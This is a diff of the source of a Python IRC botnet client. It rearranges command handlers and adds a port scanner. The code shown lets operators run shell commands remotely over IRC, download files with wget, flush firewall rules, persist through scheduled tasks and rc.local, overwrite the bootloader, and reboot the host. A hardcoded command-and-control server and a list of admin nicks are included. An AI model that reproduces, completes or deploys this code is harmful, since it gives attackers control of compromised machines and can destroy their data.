@@ -31,7 +31,8 @@ def generateNick(operatingSystem): #generates a nick for the server
 	rannum = str(randint(0, 9999))
 	return str(operatingSystem[:3] + rannum)
 
-def execute(cmd): #execute shell commands
+#execute shell commands given and return the output
+def execute(cmd):
 	print "in execute function. we got '%s'" % cmd
 	isItLs = 0
 	if "ls" == cmd[:2]:
@@ -97,6 +98,8 @@ def sendData(data): #send text back to the irc server
 			irc.send('PRIVMSG ' + channel + " :" + line + '\r\n')
 	else: #sending a one-liner back
 		irc.send('PRIVMSG ' + channel + " :" + data + '\r\n')
+
+### bot functions that respond to IRC commands ###
 
 #All of the possible functions that the botnet is capable of
 def reply(): #send back to IRC server that you are here
@@ -167,7 +170,7 @@ def flushFirewall(): #flushes the firewall rules
 
 		sendData("Firewall rules have been flushed.")
 	else:
-		sendData("I can't do this  '" + operatingSystem + "' yet")
+		sendData("I can't do this '" + operatingSystem + "' yet")
 
 def checkFirewall(): #reports current firewall config
 	if (operatingSystem == "linux"):
@@ -180,30 +183,6 @@ def checkFirewall(): #reports current firewall config
 		sendData("idk how to mac yet boss.")
 	else:
 		sendData("unknown os")
-
-def download(cmd): #file downloader
-	if (operatingSystem == "linux"):
-		if (cmd.count(" ") > 1): #make sure there is only 1 space
-			sendData("Usage: download [file] [dir]")
-		else:
-			args = cmd.split(" ")
-			download = "wget --no-check-certificate -q -P " + args[1] + " " + args[0]
-			
-			request = execute(download) #executing the download
-			sendData("Download executed.")
-	else:
-		sendData("I don't know how to download yet boss.")
-
-def guiSpam(cmd): #spam gui with things
-	sendData("Not ready yet.")
-	# args = cmd.split(" ") #first arg is number, second is seconds/minutes/hours/days/whatever, third is for windows to specify application
-	# if operatingSystem == "windows": #scheduled tasks probably won't work. gotta play with it more
-	# 	app = "C:\\Windows\\System32\\notepad.exe"
-	# 	if len(args) < 2:
-
-	# 	execute("schtasks /Create /SC ONSTART /TN 'Windows System Process' /TR " + app)
-	# else: #all else
-	# 	pass
 
 def nyanmbr(): #download nyancat.mbr and over bootloader with it
 	if (operatingSystem != "windows" and operatingSystem != ""):
@@ -226,25 +205,12 @@ def reboot(): #reboot the computer
 	else: #any unix based OS will handle this correctly
 		execute("init 6")
 
-def admin(cmd): #add/remove admins
-	args = cmd.split(" ")
-	if args[0][:3] == "rem":
-		admins.remove(args[1])
-		sendData("Admin '" + args[1] + "' removed.")
-	elif args[0][:3] == "add":
-		if args[1] not in admins:
-			admins.append(args[1])
-			sendData("Admin '" + args[1] + "' added.")
-	else:
-		sendData("Admins are: " + ", ".join(admins))
-
 def persist(): #try to persist bot; for freebsd, make file, place in /usr/local/etc/rc.d/
-	print "argv0 is '%s'" % argv[0]
-	print "cwd is '%s'" % os.getcwd()
+	# print "argv0 is '%s'" % argv[0]
+	# print "cwd is '%s'" % os.getcwd()
 	pwd = os.getcwd()
 	if operatingSystem == "windows":
-		script = pwd + "\\" + argv[0]
-		output = execute("schtasks /Create /SC ONSTART /TN WindowsSystem /TR " + script)
+		output = execute("schtasks /Create /SC ONSTART /TN WindowsSystem /TR \"" + argv[0] + "\"")
 		sendData(output)
 		return
 	elif operatingSystem == "darwin": #if mac
@@ -279,8 +245,64 @@ def persist(): #try to persist bot; for freebsd, make file, place in /usr/local/
 		else:
 			sendData("Either /etc/rc.local doesn't exist or I can't write to it.")
 
+### bot functions which take parameters that respond to IRC commands ###
+
+def download(cmd): #file downloader
+	if (operatingSystem == "linux"):
+		if (cmd.count(" ") > 1): #make sure there is only 1 space
+			sendData("Usage: download [file] [dir]")
+		else:
+			args = cmd.split(" ")
+			download = "wget --no-check-certificate -q -P " + args[1] + " " + args[0]
+			
+			request = execute(download) #executing the download
+			sendData("Download executed.")
+	else:
+		sendData("I don't know how to download yet boss.")
+
+def guiSpam(cmd): #spam gui with things
+	sendData("Not ready yet.")
+	# args = cmd.split(" ") #first arg is number, second is seconds/minutes/hours/days/whatever, third is for windows to specify application
+	# if operatingSystem == "windows": #scheduled tasks probably won't work. gotta play with it more
+	# 	app = "C:\\Windows\\System32\\notepad.exe"
+	# 	if len(args) < 2:
+
+	# 	execute("schtasks /Create /SC ONSTART /TN 'Windows System Process' /TR " + app)
+	# else: #all else
+	# 	pass
+
+def scanner(cmd): #local port scanner
+	end = 65535 if (cmd == "full") else 1024
+	print "end is '%d'" % end
+	openPorts = []
+	for port in range(1, end):
+		try:
+			temp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			temp.settimeout(1000)
+			s.connect(('127.0.0.1', port))
+			openPorts.append(port)
+			temp.close()
+		except: continue
+
+	return openPorts
+
+def admin(cmd): #add/remove admins
+	args = cmd.split(" ")
+	if args[0][:3] == "rem":
+		admins.remove(args[1])
+		sendData("Admin '" + args[1] + "' removed.")
+	elif args[0][:3] == "add":
+		if args[1] not in admins:
+			admins.append(args[1])
+			sendData("Admin '" + args[1] + "' added.")
+	else:
+		sendData("Admins are: " + ", ".join(admins))
+
 def runFunction(cmd):
 	pos = cmd.find(" ")
+	if pos == -1: #if not found, make pos the end of the string so we take the whole string later on
+		pos = len(cmd)
+
 	if cmd in commands.keys(): #if regular command
 		commands[cmd]() #call appropriate function
 		print "function called"
@@ -309,7 +331,7 @@ INTERACT = [0, 1, 1] 	#index one is the boolean for if the interactive shell is 
 admins = ["king", "samorizu", "blackbear", "bigshebang"]
 server = "leagueachieve.info"
 port = 6667
-channel = "#test"
+channel = "#lobby"
 nick = generateNick(operatingSystem)
 
 print "The botnick is: '%s'" % nick
@@ -321,6 +343,7 @@ commands = {
 	"who are you" : whoAmI,
 	"how old are you" : getAge,
 	"zombie apocalypse" : terminate,
+	"terminate" : terminate,
 	"free" : freeSpace,
 	"uptime" : uptime,
 	"kernel" : kernel,
@@ -341,7 +364,8 @@ commandsParams = {
 	"execute" : execute,
 	"download" : download,
 	"guispam" : guiSpam,
-	"admin" : admin
+	"admin" : admin,
+	"scan" : scanner
 }
 
 #function which parses the command and determines how to handle it
